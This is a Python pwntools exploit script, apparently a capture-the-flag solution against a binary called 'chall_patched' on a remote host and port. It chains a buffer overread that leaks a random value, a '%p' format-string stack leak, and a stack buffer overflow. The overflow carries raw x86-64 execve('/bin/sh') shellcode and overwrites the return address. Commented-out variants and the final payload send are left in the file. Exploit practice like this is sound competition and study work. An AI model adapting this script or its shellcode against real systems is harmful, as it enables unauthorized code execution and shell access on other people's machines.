# -*- coding: utf-8 -*-
from pwn import*
context.log_level='debug'
context.arch='amd64'
context.os = "linux"
 
pc = "./chall_patched"

scripts = """
break *highscore+281
"""
 
if __name__ == '__main__':
    local = sys.argv[1]
    if local == '1':
        r= process(pc)
        elf = ELF(pc)
        libc = elf.libc
    else:
        r=remote("34.45.81.67",16004)
        elf = ELF(pc)
        libc = elf.libc
 
sa = lambda s,n : r.sendafter(s,n)
sla = lambda s,n : r.sendlineafter(s,n)
sl = lambda s : r.sendline(s)
sd = lambda s : r.send(s)
rc = lambda n : r.recv(n)
rl = lambda n : r.recv(n)
ru = lambda s : r.recvuntil(s)
ti = lambda: r.interactive()
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bhex = lambda b: int(b.decode(), 16)
dbg = lambda: gdb.attach(r)
dbgstart = lambda script=scripts: gdb.attach(r, gdbscript=script)

dbgstart()
# p = b'a'*0x20
# leak random number  
sla("> ",b'a'*64)
ru(b'a'*64)
guess = rc(1)[0]
print("guess here >>",guess)
sla("honks?", str(guess).encode())

# format string
payload = b'%p %p %p %p %p %p %p %p'
sla("again?",payload)
ru("wow ")

# leak info
stack_leak = bhex(rc(14))
print("leak >>>", hex(stack_leak))
# dbg()
sla("world?",b'aaaabbbb')
buf = 0x7ffd13969b20
leak = 0x7ffd13969c70
shellcode_offset =  leak - buf
shellcode_address = stack_leak - shellcode_offset
print("offset >>>",shellcode_offset)
print("shell addr >>>",hex(shellcode_address))

# shellcode + (offset  - len(shellcode)) + 8 + buffer address (where shellcode save)
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
# shellcode = asm(shellcraft.sh())

# self shellcode payload 
payload = shellcode
payload += b'a'*(0x170 + 8 -len(shellcode))
payload += p64(shellcode_address)

# w1 payload, idky + 0x5a
# payload = b'a'*(0x170+8)
# payload += p64(leak + 0x5a)
# payload += shellcode

# w2 payload
# payload = asm('nop')*100
# payload += shellcode
# payload += b'a'*(0x170 +8 - 100 -len(shellcode))
# payload += p64(stack_leak-0x150)

# sla("world?",payload)
ti()